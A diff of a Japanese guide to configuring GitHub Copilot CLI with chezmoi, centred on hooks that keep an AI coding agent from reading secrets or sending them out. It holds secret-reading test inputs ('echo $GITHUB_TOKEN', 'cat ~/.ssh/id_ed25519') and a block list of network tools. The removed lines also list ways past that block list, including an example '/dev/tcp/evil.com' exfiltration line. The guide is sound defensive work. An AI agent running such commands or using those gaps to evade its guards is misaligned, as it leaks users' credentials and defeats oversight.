@@ -1,32 +1,24 @@
 # GitHub Copilot CLI Guide
 
-GitHub Copilot CLI の設定・運用ガイドである。chezmoi が `~/.copilot/` 配下のカスタム指示、フック、スキルを管理する。プラグインは Copilot CLI のプラグインマネージャが管理するため chezmoi の対象外である。
+この repo では `~/.copilot/` 配下のうち、**自分で維持したい設定だけ** を chezmoi で管理する。Copilot CLI 自体の一般的な使い方や `/plugin` の詳細は公式ドキュメントを参照。
 
-このガイドでは以下を扱う。
+## 管理境界
 
-- **管理対象ファイル**: chezmoi で管理するファイルと管理外のファイルの一覧
-- **プラグイン / スキル**: 追加・更新の手順
-- **セキュリティフック**: 設定のカスタマイズとテスト方法（設計の詳細は [`docs/architecture.md`](architecture.md#copilot-guard-の設計) を参照）
-
-## 管理対象ファイル
-
-| ファイル | 用途 | 管理方法 |
-|---------|------|----------|
+| パス | 用途 | 管理方法 |
+|------|------|----------|
 | `copilot-instructions.md` | ユーザーレベルのカスタム指示 | chezmoi |
-| `mcp-config.json` | MCP サーバー設定 | chezmoi（`/mcp add` 後は `re-add`） |
-| `hooks/hooks.json` | preToolUse / postToolUse フック定義 | chezmoi |
-| `hooks/scripts/copilot-guard.py` | セキュリティガード（ファイル・URL・環境変数） | chezmoi |
-| `hooks/scripts/uv-enforcer.py` | Python / pip 直接実行をブロック | chezmoi |
-| `hooks/scripts/audit-log.py` | ツール実行の監査ログ記録 | chezmoi |
-| `hooks/blocked-files.txt` | ブロック対象ファイルパターン (deny) | chezmoi |
-| `hooks/ask-files.txt` | 確認付きアクセスパターン (ask) | chezmoi |
+| `mcp-config.json` | MCP サーバー設定 | chezmoi (`/mcp add` 後は `chezmoi re-add`) |
+| `hooks/hooks.json` | `preToolUse` / `postToolUse` 設定 | chezmoi |
+| `hooks/scripts/copilot-guard.py` | ファイル・URL・環境変数アクセスのガード | chezmoi |
+| `hooks/scripts/uv-enforcer.py` | `python` / `pip` 直接実行の抑止 | chezmoi |
+| `hooks/scripts/audit-log.py` | ツール実行ログの記録 | chezmoi |
+| `hooks/blocked-files.txt` | deny パターン | chezmoi |
+| `hooks/ask-files.txt` | ask パターン | chezmoi |
 | `hooks/allowed-urls.txt` | URL 許可リスト | chezmoi |
-| `skills/` | エージェントスキル | chezmoi（上流更新時は `re-add`） |
-| `installed-plugins/` | プラグイン | `/plugin install` で管理 |
+| `skills/` | ユーザーレベルのスキル | chezmoi |
+| `installed-plugins/` | プラグイン | Copilot CLI 側で管理 |
 
 ## CLI 本体の導入元
-
-`copilot` CLI の本体は、プラットフォームごとに導入元を分けている。
 
 | 環境 | 導入元 |
 |------|--------|
@@ -34,31 +26,14 @@ GitHub Copilot CLI の設定・運用ガイドである。chezmoi が `~/.copilo
 | macOS | `brew` |
 | Windows | `winget` (`reference/windows/configuration.dsc.yaml`) |
 
-macOS では Copilot Desktop が GUI プロセスとして起動するため、`.zshrc` から `launchctl setenv COPILOT_CLI_PATH` を設定して Homebrew 側の `copilot` パスを公開する。
+macOS では Copilot Desktop からも参照できるよう、`.zshrc` で `COPILOT_CLI_PATH` を公開する。
 
-## プラグインの管理
+## プラグインとスキル
 
-プラグインは `/plugin` コマンドで管理する。chezmoi の管理外である。
+- **プラグイン**: `/plugin` コマンドで管理する。chezmoi の管理外
+- **スキル**: `~/.copilot/skills/` を chezmoi で管理する
 
-```text
-/plugin marketplace add <publisher>/<plugin>
-/plugin install <name>@<plugin>
-/plugin update <name>@<plugin>
-```
-
-例: [Azure Skills Plugin](https://github.com/microsoft/azure-skills)
-
-```text
-/plugin marketplace add microsoft/azure-skills
-/plugin install azure@azure-skills
-/plugin update azure@azure-skills
-```
-
-> **注意**: Azure Skills Plugin は Node.js 18+、Azure CLI (`az login`)、Azure Developer CLI (`azd auth login`) が前提である。他のプラグインの前提条件は各プラグインのドキュメントを参照する。
-
-## スキルの管理
-
-ユーザーレベルのスキル（`~/.copilot/skills/`）は chezmoi で管理する。
+スキル追加後はソースへ戻す。
 
 ```bash
 npx skills add -g <owner>/<repo>/<path>
@@ -66,133 +41,64 @@ chezmoi re-add ~/.copilot/skills/<skill-name>
 chezmoi diff
 ```
 
-現在インストール済みのスキル:
-
-| スキル | ソース | 用途 |
-|--------|--------|------|
-| `microsoft-skill-creator` | [github/awesome-copilot](https://github.com/github/awesome-copilot) (MIT) | MS Learn MCP を使って Microsoft 技術のスキルを生成 |
-
 ## セキュリティフック
 
-コーディングエージェントは `bash` ツールを通じてファイル読み取りやコマンド実行を行える。便利な一方で、秘匿情報の意図しない読み取りや外部送信のリスクがある。このリポジトリでは `preToolUse` フックで **ツール実行前に検査し、危険な操作を自動拒否（deny）または確認付きアクセス（ask）に振り分ける** ガードを提供している。
+この repo では `preToolUse` フックで、ツール実行前に次を検査する。
 
-脅威モデル、多層防御の構造、各チェック層の判定ロジックについては [`docs/architecture.md` の Copilot Guard セクション](architecture.md#copilot-guard-の設計) を参照する。
+- **秘匿ファイルの拒否**: `blocked-files.txt`
+- **確認付きアクセス**: `ask-files.txt`
+- **許可外 URL の拒否**: `allowed-urls.txt`
+- **機微な環境変数の読み取り拒否**: `copilot-guard.py`
+- **`python` / `pip` 直接実行の拒否**: `uv-enforcer.py`
 
-### 設定ファイルのカスタマイズ
+判定の詳細な設計は [`docs/architecture.md`](architecture.md#copilot-guard-の設計) を参照。
 
-#### blocked-files.txt
+### ガード用ファイルの編集
 
-ブロック対象（deny）のファイルパスをグロブパターンで記述する。1 行 1 パターン、`#` で始まる行はコメント。マッチしたファイルへのアクセスは即座に拒否される。
+- `blocked-files.txt` と `ask-files.txt` は 1 行 1 パターン
+- `#` 始まりの行はコメント
+- パス比較前に `\` は `/` へ正規化される
+- 同じパスが両方に当たる場合は **deny が優先**
 
-**パターン記法**:
+`allowed-urls.txt` は 1 行 1 ドメイン。全行コメントアウトすると URL チェックを無効化できる。
 
-| 記法 | 意味 | 例 |
-|------|------|------|
-| `*` | 1 つのパスセグメント内の任意の文字列 | `*.pem` → `server.pem` にマッチ |
-| `?` | 1 つのパスセグメント内の任意の 1 文字 | `?.key` → `a.key` にマッチ |
-| `**` | パスセグメントをまたぐ任意の文字列 | `**/.env` → `src/app/.env` にマッチ |
-| `**/` | 0 個以上のディレクトリプレフィックス | `**/.azure/*` → `.azure/config` にも `a/b/.azure/config` にもマッチ |
-
-**パス正規化**: マッチング前に `\` → `/` への変換、連続 `/` の圧縮、先頭 `./` の除去、`file://` URI の展開が行われる。Windows パス（`C:\Users\...`）も正しくマッチする。
-
-#### allowed-urls.txt
-
-許可するドメインを 1 行 1 つ記述する。サブドメインも自動的に許可される（例: `github.com` は `api.github.com` も許可）。全行コメントアウトすると URL チェック自体が無効になる。
-
-#### ask-files.txt
-
-確認付きアクセス（ask）のファイルパスをグロブパターンで記述する。`blocked-files.txt` と同じ書式・パターン記法。マッチしたファイルへのアクセスはユーザーに確認プロンプトが表示され、明示的な承認が必要になる。
-
-同一パスが `blocked-files.txt` と `ask-files.txt` の両方にマッチした場合は deny が優先される。
-
-判定の優先度: **deny > ask > allow**
-
-### フックのテスト
-
-フックは stdin に JSON を受け取り、stdout に許可 / 拒否の JSON を返す。
+## フックの確認
 
 ```bash
-# copilot-guard: ファイル・URL アクセス制御
+# ファイル・URL・環境変数アクセス
 echo '{"toolName":"edit","toolArgs":{"path":".env"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
-
-# copilot-guard: 環境変数アクセスのブロック（bash ツールのみ対象）
-echo '{"toolName":"bash","toolArgs":{"command":"printenv"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
 echo '{"toolName":"bash","toolArgs":{"command":"echo $GITHUB_TOKEN"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
 
-# copilot-guard: 安全な変数参照は許可
-echo '{"toolName":"bash","toolArgs":{"command":"echo $HOME"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
-
-# copilot-guard: Hook ファイルへの確認付きアクセス (ask)
-echo '{"toolName":"edit","toolArgs":{"path":"/home/user/.copilot/hooks/hooks.json"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
-
-# copilot-guard: SSH 鍵アクセスのブロック
-echo '{"toolName":"bash","toolArgs":{"command":"cat ~/.ssh/id_ed25519"}}' | uv run ~/.copilot/hooks/scripts/copilot-guard.py
-
-# uv-enforcer: python/pip 直接実行のブロック
+# python/pip 直接実行の抑止
 echo '{"toolName":"bash","toolArgs":{"command":"python script.py"}}' | uv run ~/.copilot/hooks/scripts/uv-enforcer.py
 ```
 
-### 自動テスト
+自動テスト:
 
 ```bash
-# ユニットテスト（86 テストケース）
 uv run -m unittest tests.test_copilot_guard -v
 ```
 
-CI でも自動実行される（`.github/workflows/test-copilot-guard.yml`）。Hook 関連ファイルの変更時と週次スケジュールで実行し、fail-open リグレッションを検知する。
+## `copilot-safe`
 
-### Autopilot モードでの安全な利用
+`.zshrc` / `PowerShell_profile.ps1` の `copilot-safe` は、Autopilot での事故を減らすための起動ラッパーである。主に次を固定する。
 
-`--allow-all` 下ではツール承認・パス権限・URL 権限がすべて無効化されるが、`--deny-tool` と Hooks は引き続き有効である。`.zshrc` / `PowerShell_profile.ps1` に定義された `copilot-safe` エイリアス/関数は、多層防御を固定化した Autopilot 起動設定である。
+- `--deny-tool` による外部送信系コマンドの制限
+- `--secret-env-vars` による機微な環境変数の隠蔽
+- `--max-autopilot-continues 20` による連続実行数の上限
 
-```bash
-copilot-safe -p "YOUR PROMPT"
-```
+`--deny-tool` の具体的な記法や制限は `copilot help permissions` と公式ドキュメントを参照。
 
-このエイリアスには以下が含まれる:
+## 監査ログ
 
-- `--deny-tool` による外部送信コマンドのブロック（fail-open リスクなし）
-- `--secret-env-vars` による機微な環境変数値の隠蔽
-- `--max-autopilot-continues 20` による実行ステップ数の上限
-
-#### `--deny-tool` でブロックするコマンド
-
-| カテゴリ | zsh | PowerShell（追加分） |
-|----------|-----|---------------------|
-| HTTP クライアント | `curl`, `wget` | `curl.exe`, `wget.exe`, `Invoke-WebRequest`, `iwr`, `Invoke-RestMethod`, `irm`, `Start-BitsTransfer`, `bitsadmin`, `bitsadmin.exe` |
-| DNS ルックアップ | `nslookup`, `dig`, `host` | `nslookup.exe`, `dig.exe`, `host.exe`, `Resolve-DnsName` |
-| Raw ネットワーク | `nc`, `netcat`, `ncat`, `socat`, `telnet` | `nc.exe`, `netcat.exe`, `ncat.exe`, `socat.exe`, `telnet.exe`, `Test-NetConnection`, `tnc` |
-| リモートファイル転送 | `ssh`, `scp`, `sftp`, `ftp` | `ssh.exe`, `scp.exe`, `sftp.exe`, `ftp.exe` |
-
-> **`shell()` のマッチングは完全一致** — コマンド名の先頭に対する exact match で判定される（`copilot help permissions` 参照）。そのため Windows の `.exe` 付き形式や PowerShell エイリアスは別エントリとしてブロックする必要がある。`shell(ssh)` は `ssh-keygen` には誤爆しない。
-
-#### `--deny-tool` の限界
-
-`--deny-tool` はコマンド名ベースのブロックであり、**包括的なデータ送信防止ではない**。以下の経路はカバーできない:
-
-- **汎用ランタイム経由**: `python -c "import urllib..."`, `node -e "require('http')..."`, `.NET` の `System.Net.WebClient` 等
-- **bash の疑似デバイス**: `echo $SECRET > /dev/tcp/evil.com/80`
-- **エンコードされたコマンド**: Base64 等で難読化されたコマンドの間接実行
-
-これらは copilot-guard.py の URL 許可リストチェック、環境変数アクセスチェック、および OS レベルのネットワーク制御で補完する。`--deny-tool` は多層防御の第一層（fail-open リスクなし）として機能し、copilot-guard.py（第二層）と組み合わせて使う設計である。
-
-ファイルの読み取り・書き込み保護は `--deny-tool` ではなく preToolUse Hook（copilot-guard.py + blocked-files.txt / ask-files.txt）が担う。`--deny-tool` がサポートする kind は `shell(cmd)`, `write`（パス指定不可）, `url(domain)`, `<MCP>(tool)` のみであり、`read(...)` kind は存在しない（`copilot help permissions` で確認済み）。
-
-環境に応じて `--disable-mcp-server` や `--excluded-tools` を追加して攻撃面をさらに縮小できる。
-
-### 監査ログ
-
-`postToolUse` フックにより、ツール実行ごとに `~/.copilot/audit.jsonl` へログが記録される。
+`postToolUse` フックで `~/.copilot/audit.jsonl` に記録する。
 
 ```bash
-# 直近のツール実行を確認
-tail -5 ~/.copilot/audit.jsonl | python3 -m json.tool
-
-# 環境変数 COPILOT_AUDIT_DIR でログ出力先を変更可能
+tail -5 ~/.copilot/audit.jsonl | uv run python -m json.tool
 COPILOT_AUDIT_DIR=/path/to/logs copilot
 ```
 
-### 参考資料
+## 参考
 
-- [GitHub Copilot CLI — Permissions](https://docs.github.com/en/copilot/copilot-cli/using-copilot-cli/permissions) — 公式のパーミッション設計ドキュメント
-- [GitHub Copilot CLI — Hooks](https://docs.github.com/en/copilot/copilot-cli/using-copilot-cli/using-copilot-cli-hooks) — 公式の Hooks 設定リファレンス
+- [GitHub Copilot CLI — Permissions](https://docs.github.com/en/copilot/copilot-cli/using-copilot-cli/permissions)
+- [GitHub Copilot CLI — Hooks](https://docs.github.com/en/copilot/copilot-cli/using-copilot-cli/using-copilot-cli-hooks)
